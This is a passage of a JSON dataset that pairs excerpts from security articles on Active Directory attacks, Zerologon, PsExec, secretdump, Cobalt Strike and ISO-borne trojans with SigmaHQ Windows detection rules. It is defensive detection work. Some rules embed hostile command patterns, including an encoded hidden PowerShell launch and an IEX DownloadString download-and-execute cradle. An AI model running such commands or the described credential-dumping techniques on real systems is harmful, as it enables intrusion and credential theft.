    "markdown": "# Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync *Published on November 22, 2015* *Categories: ActiveDirectorySecurity, Microsoft Security, Technical Reference* The two key goals of any attack is access and persistence. This post covers elements of each. In a post-exploitation scenario where the attacker has compromised the domain or an account with delegated rights, it’s possible to dump the clear-text passwords of admins without being a Domain Admin*. This method requires the Active Directory Domain Functional Level (DFL) to be Windows Server 2008 or higher and a patient attacker (as well as appropriate rights). * depending",
    "sigma_rule": {
      "title": "Weak Encryption Enabled and Kerberoast",
      "id": "f6de9536-0441-4b3f-a646-f4e00f300ffd",
      "status": "test",
      "description": "Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.",
      "references": [
        "https://adsecurity.org/?p=2053",
        "https://blog.harmj0y.net/redteaming/another-word-on-delegation/"
      ],
      "author": "@neu5ron",
      "date": "2017-07-30",
      "modified": "2021-11-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management"
      },
      "detection": {
        "selection": {
          "EventID": 4738
        },
        "olduac_des": {
          "OldUacValue|endswith": [
            "8???",
            "9???",
            "A???",
            "B???",
            "C???",
            "D???",
            "E???",
            "F???"
          ]
        },
        "newuac_des": {
          "NewUacValue|endswith": [
            "8???",
            "9???",
            "A???",
            "B???",
            "C???",
            "D???",
            "E???",
            "F???"
          ]
        },
        "olduac_preauth": {
          "OldUacValue|endswith": [
            "1????",
            "3????",
            "5????",
            "7????",
            "9????",
            "B????",
            "D????",
            "F????"
          ]
        },
        "newuac_preauth": {
          "NewUacValue|endswith": [
            "1????",
            "3????",
            "5????",
            "7????",
            "9????",
            "B????",
            "D????",
            "F????"
          ]
        },
        "olduac_encrypted": {
          "OldUacValue|endswith": [
            "8??",
            "9??",
            "A??",
            "B??",
            "C??",
            "D??",
            "E??",
            "F??"
          ]
        },
        "newuac_encrypted": {
          "NewUacValue|endswith": [
            "8??",
            "9??",
            "A??",
            "B??",
            "C??",
            "D??",
            "E??",
            "F??"
          ]
        },
        "condition": "selection and ((newuac_des and not olduac_des) or (newuac_preauth and not olduac_preauth) or (newuac_encrypted and not olduac_encrypted))"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_alert_enable_weak_encryption.yml"
  },
  "752": {
    "url": "https://blog.harmj0y.net/redteaming/another-word-on-delegation/",
    "markdown": "# Another Word on Delegation **3 Comments** / **Red Teaming** / **Published on October 25, 2018** Every time I think I start to understand Active Directory and Kerberos, a new topic pops up to mess with my head. A few weeks ago, @elad_shamir contacted @tifkin_ and myself with some ideas about resource-based Kerberos constrained delegation. Thanks to Elad’s ideas, the great back and forth, and his awesome pull request to Rubeus, we now understand this attack vector and have a tool to abuse it. We also now have something @_wald0, @cptjesus, and I have wanted for a long while- an",
    "sigma_rule": {
      "title": "Weak Encryption Enabled and Kerberoast",
      "id": "f6de9536-0441-4b3f-a646-f4e00f300ffd",
      "status": "test",
      "description": "Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.",
      "references": [
        "https://adsecurity.org/?p=2053",
        "https://blog.harmj0y.net/redteaming/another-word-on-delegation/"
      ],
      "author": "@neu5ron",
      "date": "2017-07-30",
      "modified": "2021-11-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management"
      },
      "detection": {
        "selection": {
          "EventID": 4738
        },
        "olduac_des": {
          "OldUacValue|endswith": [
            "8???",
            "9???",
            "A???",
            "B???",
            "C???",
            "D???",
            "E???",
            "F???"
          ]
        },
        "newuac_des": {
          "NewUacValue|endswith": [
            "8???",
            "9???",
            "A???",
            "B???",
            "C???",
            "D???",
            "E???",
            "F???"
          ]
        },
        "olduac_preauth": {
          "OldUacValue|endswith": [
            "1????",
            "3????",
            "5????",
            "7????",
            "9????",
            "B????",
            "D????",
            "F????"
          ]
        },
        "newuac_preauth": {
          "NewUacValue|endswith": [
            "1????",
            "3????",
            "5????",
            "7????",
            "9????",
            "B????",
            "D????",
            "F????"
          ]
        },
        "olduac_encrypted": {
          "OldUacValue|endswith": [
            "8??",
            "9??",
            "A??",
            "B??",
            "C??",
            "D??",
            "E??",
            "F??"
          ]
        },
        "newuac_encrypted": {
          "NewUacValue|endswith": [
            "8??",
            "9??",
            "A??",
            "B??",
            "C??",
            "D??",
            "E??",
            "F??"
          ]
        },
        "condition": "selection and ((newuac_des and not olduac_des) or (newuac_preauth and not olduac_preauth) or (newuac_encrypted and not olduac_encrypted))"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_alert_enable_weak_encryption.yml"
  },
  "753": {
    "url": "https://web.archive.org/web/20230409194125/https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html",
    "markdown": "# Threat Hunting #25 - Scheduled Tasks for Persistence and/or Remote Execution The Task Scheduler enables you to automatically perform routine tasks on a chosen computer. The Task Scheduler does this by monitoring whatever criteria you choose to initiate the tasks (referred to as triggers) and then executing the tasks (Action) when the criteria is met (user logon, system startup, event log triggered, fixed execution time reached etc.). Attackers (ab)use Task Scheduler to guarantee persistence and/or remote execution. In this post, we will be covering some of the suspicious scheduled tasks related behaviors that you can start hunting for: ###",
    "sigma_rule": {
      "title": "Remote Task Creation via ATSVC Named Pipe",
      "id": "f6de6525-4509-495a-8a82-1f8b0ed73a00",
      "status": "test",
      "description": "Detects remote task creation via at.exe or API interacting with ATSVC namedpipe",
      "references": [
        "https://web.archive.org/web/20230409194125/https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html"
      ],
      "author": "Samir Bousseaden",
      "date": "2019-04-03",
      "modified": "2024-08-01",
      "tags": [
        "attack.lateral-movement",
        "attack.persistence",
        "car.2013-05-004",
        "car.2015-04-001",
        "attack.t1053.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName": "atsvc",
          "AccessList|contains": "WriteData"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_atsvc_task.yml"
  },
  "754": {
    "url": "https://twitter.com/duzvik/status/1269671601852813320",
    "markdown": "# Post Jun 7, 2020 Did you ever cover your computer camera with a little strip of tape? Sigma to detect processes accessing the camera and microphone from a suspicious folder. https://gist.github.com/duzvik/039869d60e16d09fac7412a841d44e41 ```image Description: The image is a detailed configuration file or code snippet related to tracking processes accessing the camera and microphone on a Windows system. It includes specific selections for Sysmon logging under the category 'sysmon' and provides information on event IDs, target objects, and conditions necessary for detection. The content is structured in YAML format, which outlines the detection rules, including paths to be monitored and specific",
    "sigma_rule": {
      "title": "Processes Accessing the Microphone and Webcam",
      "id": "8cd538a4-62d5-4e83-810b-12d41e428d6e",
      "status": "test",
      "description": "Potential adversaries accessing the microphone and webcam in an endpoint.",
      "references": [
        "https://twitter.com/duzvik/status/1269671601852813320",
        "https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072"
      ],
      "author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
      "date": "2020-06-07",
      "modified": "2021-11-27",
      "tags": [
        "attack.collection",
        "attack.t1123"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": [
            4657,
            4656,
            4663
          ],
          "ObjectName|contains": [
            "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged",
            "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_camera_microphone_access.yml"
  },
  "755": {
    "url": "https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072",
    "markdown": "# Can you track processes accessing the camera and microphone? In certain investigations, it may arise that you need to find the following: - What process was using the camera or microphone? - When was the last session? - How long was that session? Using the contents of the following reg keys, you can determine when and how long a process had access to privacy protected resources. These resources include the microphone, webcam, bluetooth, location, contacts and more. For this blog, I will focus on the microphone and webcam as an example. ``` HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\ HKEY_USERS\\*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\ HKEY_USERS\\*\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\ ``` > EDIT",
    "sigma_rule": {
      "title": "Processes Accessing the Microphone and Webcam",
      "id": "8cd538a4-62d5-4e83-810b-12d41e428d6e",
      "status": "test",
      "description": "Potential adversaries accessing the microphone and webcam in an endpoint.",
      "references": [
        "https://twitter.com/duzvik/status/1269671601852813320",
        "https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072"
      ],
      "author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
      "date": "2020-06-07",
      "modified": "2021-11-27",
      "tags": [
        "attack.collection",
        "attack.t1123"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": [
            4657,
            4656,
            4663
          ],
          "ObjectName|contains": [
            "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged",
            "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_camera_microphone_access.yml"
  },
  "756": {
    "url": "https://www.sans.org/webcasts/119395",
    "markdown": "# Tech Tuesday Workshop Cobalt Strike Detection via Log Analysis **11 May 2021** Cobalt Strike has become the attack tool of choice among enlightened global threat actors, making an appearance in almost every recent major hack. Cobalt Strike is an extremely capable and stealthy tool suite, but log analysis can level the playing field, providing many opportunities for detection. This workshop will leverage data sourced from SANS FOR508: Advanced Incident Response, Threat Hunting and Digital Forensics to provide insight into how Cobalt Strike operates and how to detect many of its characteristics via endpoint logs. Whether you are just starting",
    "sigma_rule": {
      "title": "CobaltStrike Service Installations - Security",
      "id": "d7a95147-145f-4678-b85d-d1ff4a3bb3f6",
      "related": [
        {
          "id": "5a105d34-05fc-401e-8553-272b45c1522d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "references": [
        "https://www.sans.org/webcasts/119395",
        "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Wojciech Lesicki",
      "date": "2021-05-26",
      "modified": "2022-11-27",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.lateral-movement",
        "attack.t1021.002",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697"
      },
      "detection": {
        "event_id": {
          "EventID": 4697
        },
        "selection1": {
          "ServiceFileName|contains|all": [
            "ADMIN$",
            ".exe"
          ]
        },
        "selection2": {
          "ServiceFileName|contains|all": [
            "%COMSPEC%",
            "start",
            "powershell"
          ]
        },
        "selection3": {
          "ServiceFileName|contains": "powershell -nop -w hidden -encodedcommand"
        },
        "selection4": {
          "ServiceFileName|base64offset|contains": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:"
        },
        "condition": "event_id and 1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_cobaltstrike_service_installs.yml"
  },
  "757": {
    "url": "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
    "markdown": "",
    "sigma_rule": {
      "title": "CobaltStrike Service Installations - Security",
      "id": "d7a95147-145f-4678-b85d-d1ff4a3bb3f6",
      "related": [
        {
          "id": "5a105d34-05fc-401e-8553-272b45c1522d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "references": [
        "https://www.sans.org/webcasts/119395",
        "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Wojciech Lesicki",
      "date": "2021-05-26",
      "modified": "2022-11-27",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.lateral-movement",
        "attack.t1021.002",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697"
      },
      "detection": {
        "event_id": {
          "EventID": 4697
        },
        "selection1": {
          "ServiceFileName|contains|all": [
            "ADMIN$",
            ".exe"
          ]
        },
        "selection2": {
          "ServiceFileName|contains|all": [
            "%COMSPEC%",
            "start",
            "powershell"
          ]
        },
        "selection3": {
          "ServiceFileName|contains": "powershell -nop -w hidden -encodedcommand"
        },
        "selection4": {
          "ServiceFileName|base64offset|contains": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:"
        },
        "condition": "event_id and 1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_cobaltstrike_service_installs.yml"
  },
  "758": {
    "url": "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/",
    "markdown": "# Cobalt Strike, a Defender’s Guide **Categories:** CobaltStrike, Tools **Published on:** August 29, 2021 --- ## Intro In our research, we expose adversarial Tactics, Techniques, and Procedures (TTPs) as well as the tools they use to execute their mission objectives. In most of our cases, we see the threat actors utilizing Cobalt Strike. Therefore, defenders should know how to detect Cobalt Strike in various stages of its execution. The primary purpose of this post is to expose the most common techniques that we see from the intrusions that we track and provide detections. Having said that, not all of Cobalt",
    "sigma_rule": {
      "title": "CobaltStrike Service Installations - Security",
      "id": "d7a95147-145f-4678-b85d-d1ff4a3bb3f6",
      "related": [
        {
          "id": "5a105d34-05fc-401e-8553-272b45c1522d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "references": [
        "https://www.sans.org/webcasts/119395",
        "https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/",
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Florian Roth (Nextron Systems), Wojciech Lesicki",
      "date": "2021-05-26",
      "modified": "2022-11-27",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.lateral-movement",
        "attack.t1021.002",
        "attack.t1543.003",
        "attack.t1569.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697"
      },
      "detection": {
        "event_id": {
          "EventID": 4697
        },
        "selection1": {
          "ServiceFileName|contains|all": [
            "ADMIN$",
            ".exe"
          ]
        },
        "selection2": {
          "ServiceFileName|contains|all": [
            "%COMSPEC%",
            "start",
            "powershell"
          ]
        },
        "selection3": {
          "ServiceFileName|contains": "powershell -nop -w hidden -encodedcommand"
        },
        "selection4": {
          "ServiceFileName|base64offset|contains": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:"
        },
        "condition": "event_id and 1 of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_cobaltstrike_service_installs.yml"
  },
  "759": {
    "url": "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",
    "markdown": "# Hunting in Active Directory: Unconstrained Delegation & Forests Trusts During DerbyCon 2018 this past October, my teammates @tifkin_, @enigma0x3 and @harmj0y gave an awesome presentation titled “The Unintended Risks of Trusting Active Directory”. They demonstrated how an adversary could coerce a domain controller (DC) to authenticate to a server configured with unconstrained delegation, capture the domain controller’s Ticket-Granting-Ticket (TGT), and export the TGT in order to impersonate the DC and perform attacks such as DCSync to request any domain user’s password. For their talk, this use case was presented in the context of one forest with multiple sub-domains; however,",
    "sigma_rule": {
      "title": "DCERPC SMB Spoolss Named Pipe",
      "id": "214e8f95-100a-4e04-bb31-ef6cba8ce07e",
      "status": "test",
      "description": "Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.",
      "references": [
        "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",
        "https://dirkjanm.io/a-different-way-of-abusing-zerologon/",
        "https://twitter.com/_dirkjan/status/1309214379003588608"
      ],
      "author": "OTR (Open Threat Research)",
      "date": "2018-11-28",
      "modified": "2022-08-11",
      "tags": [
        "attack.lateral-movement",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName": "spoolss"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Domain Controllers acting as printer servers too? :)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_dce_rpc_smb_spoolss_named_pipe.yml"
  },
  "760": {
    "url": "https://dirkjanm.io/a-different-way-of-abusing-zerologon/",
    "markdown": "# A different way of abusing Zerologon (CVE-2020-1472) In August 2020, Microsoft patched CVE-2020-1472 aka Zerologon. This is in my opinion one of the most critical Active Directory vulnerabilities of the past few years, since it allows for instant escalation to Domain Admin without credentials. The most straightforward way to exploit this involves changing the password of a Domain Controller computer account. This is a risky move and could potentially break things in the environment. In this blog we explore a new way to exploit this vulnerability, which though it has a few more prerequisites, is safer to use for",
    "sigma_rule": {
      "title": "DCERPC SMB Spoolss Named Pipe",
      "id": "214e8f95-100a-4e04-bb31-ef6cba8ce07e",
      "status": "test",
      "description": "Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.",
      "references": [
        "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",
        "https://dirkjanm.io/a-different-way-of-abusing-zerologon/",
        "https://twitter.com/_dirkjan/status/1309214379003588608"
      ],
      "author": "OTR (Open Threat Research)",
      "date": "2018-11-28",
      "modified": "2022-08-11",
      "tags": [
        "attack.lateral-movement",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName": "spoolss"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Domain Controllers acting as printer servers too? :)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_dce_rpc_smb_spoolss_named_pipe.yml"
  },
  "761": {
    "url": "https://twitter.com/_dirkjan/status/1309214379003588608",
    "markdown": "# Post Sep 24, 2020 New blog: A different way of abusing Zerologon. No more password reset needed: using the printer bug with Zerologon to relay to DRSUAPI and DCSync directly with ntlmrelayx: https://dirkjanm.io/a-different-way-of-abusing-zerologon/ Code: https://github.com/dirkjanm/CVE-2020-1472/tree/master/relaying ```image Description: The image is a diagram illustrating the process of abusing the Zerologon vulnerability. It features two domain controllers labeled DC1 and DC2, with an attacker in between. The steps are numbered from 1 to 4, showing the sequence of actions: 1) Authentication and printer notification to DC1, 2) Authentication process, 3) Relay of the Zerologon exploit, and 4) Final relay to DC2.",
    "sigma_rule": {
      "title": "DCERPC SMB Spoolss Named Pipe",
      "id": "214e8f95-100a-4e04-bb31-ef6cba8ce07e",
      "status": "test",
      "description": "Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.",
      "references": [
        "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",
        "https://dirkjanm.io/a-different-way-of-abusing-zerologon/",
        "https://twitter.com/_dirkjan/status/1309214379003588608"
      ],
      "author": "OTR (Open Threat Research)",
      "date": "2018-11-28",
      "modified": "2022-08-11",
      "tags": [
        "attack.lateral-movement",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName": "spoolss"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Domain Controllers acting as printer servers too? :)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_dce_rpc_smb_spoolss_named_pipe.yml"
  },
  "762": {
    "url": "https://web.archive.org/web/20230329171218/https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html",
    "markdown": "# Threat Hunting #3 - Detecting PsExec execution using event 5145 PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems. Existing detection of PSEXEC can be easily bypassed: - **PSEXEC Service created** - logged by EventID 7045 \"Service Creation\" [\"**psexec -r spoolsvr**\" option allows to bypass this one] - **Remote registry change** due",
    "sigma_rule": {
      "title": "Impacket PsExec Execution",
      "id": "32d56ea1-417f-44ff-822b-882873f5f43b",
      "status": "test",
      "description": "Detects execution of Impacket's psexec.py.",
      "references": [
        "https://web.archive.org/web/20230329171218/https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html"
      ],
      "author": "Bhabesh Raj",
      "date": "2020-12-14",
      "modified": "2022-09-22",
      "tags": [
        "attack.lateral-movement",
        "attack.t1021.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"
      },
      "detection": {
        "selection1": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\IPC$",
          "RelativeTargetName|contains": [
            "RemCom_stdin",
            "RemCom_stdout",
            "RemCom_stderr"
          ]
        },
        "condition": "selection1"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_impacket_psexec.yml"
  },
  "763": {
    "url": "https://web.archive.org/web/20230329153811/https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html",
    "markdown": "# Threat Hunting #9 - Impacket\\Secretdump remote execution using EventId 5145 **Date:** Thursday, 7 February 2019 Secretdump.py performs various techniques to dump hashes from the remote machine without executing any agent there. If executed against a AD with domain admin privileges, all accounts hashes will be leaked. For SAM and LSA Secrets (including cached creds) it reads from the registry and then saves the hives in the target system (%SYSTEMROOT%\\Temp dir) and reads the rest of the data from there. For NTDS.dit: 1. Get the domain users list and get its hashes and Kerberos keys using [MS-DRDS] DRSGetNCChanges() call, replicating",
    "sigma_rule": {
      "title": "Possible Impacket SecretDump Remote Activity",
      "id": "252902e3-5830-4cf6-bf21-c22083dfd5cf",
      "status": "test",
      "description": "Detect AD credential dumping using impacket secretdump HKTL",
      "references": [
        "https://web.archive.org/web/20230329153811/https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html"
      ],
      "author": "Samir Bousseaden, wagga",
      "date": "2019-04-03",
      "modified": "2022-08-11",
      "tags": [
        "attack.credential-access",
        "attack.t1003.002",
        "attack.t1003.004",
        "attack.t1003.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 5145,
          "ShareName": "\\\\\\\\\\*\\\\ADMIN$",
          "RelativeTargetName|contains|all": [
            "SYSTEM32\\",
            ".tmp"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_impacket_secretdump.yml"
  },
  "764": {
    "url": "https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
    "markdown": "# Malicious Spam Campaign Uses ISO Image Files to Deliver LokiBot and NanoCore **Published on:** June 28, 2019 As cybercriminals become more creative with their spamming techniques, it shouldn’t be surprising to see more unusual file types being employed as file attachments, as was the case with an April campaign discovered by Netskope that used ISO image files to deliver two notorious Trojans: LokiBot and NanoCore. The malicious spam comes in the form of a fake invoice email which states that the recipient can access the billing by opening an ISO image attachment. This is notable because invoices are usually",
    "sigma_rule": {
      "title": "ISO Image Mounted",
      "id": "0248a7bc-8a9a-4cd8-a57e-3ae8e073a073",
      "status": "test",
      "description": "Detects the mount of an ISO image on an endpoint",
      "references": [
        "https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages",
        "https://twitter.com/MsftSecIntel/status/1257324139515269121",
        "https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image"
      ],
      "author": "Syed Hasan (@syedhasan009)",
      "date": "2021-05-29",
      "modified": "2023-11-09",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "The advanced audit policy setting \"Object Access > Audit Removable Storage\" must be configured for Success/Failure"
      },
      "detection": {
        "selection": {
          "EventID": 4663,
          "ObjectServer": "Security",
          "ObjectType": "File",
          "ObjectName|startswith": "\\Device\\CdRom"
        },
        "filter_main_generic": {
          "ObjectName": [
            "\\Device\\CdRom0\\autorun.ico",
            "\\Device\\CdRom0\\setup.exe",
            "\\Device\\CdRom0\\setup64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Software installation ISO files"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_iso_mount.yml"
  },
  "765": {
    "url": "https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages",
    "markdown": "# Threat Actor Profile: TA2719 Uses Colorful Lures to Deliver RATs in Local Languages **August 26, 2020** *The Proofpoint Threat Research Team* In late March 2020, Proofpoint researchers began tracking a new actor with a penchant for using NanoCore and later AsyncRAT, popular commodity remote access trojans (RATs). Dubbed TA2719 by Proofpoint, the actor uses localized lures with colorful images that impersonate local banks, law enforcement, and shipping services. To date, Proofpoint has observed this actor send low volume campaigns to recipients in Austria, Chile, Greece, Hungary, Italy, North Macedonia, Netherlands, Spain, Sweden, Taiwan, United States, and Uruguay. Below are",
    "sigma_rule": {
      "title": "ISO Image Mounted",
      "id": "0248a7bc-8a9a-4cd8-a57e-3ae8e073a073",
      "status": "test",
      "description": "Detects the mount of an ISO image on an endpoint",
      "references": [
        "https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore",
        "https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages",
        "https://twitter.com/MsftSecIntel/status/1257324139515269121",
        "https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image"
      ],
      "author": "Syed Hasan (@syedhasan009)",
      "date": "2021-05-29",
      "modified": "2023-11-09",
      "tags": [
        "attack.initial-access",
        "attack.t1566.001"
      ],
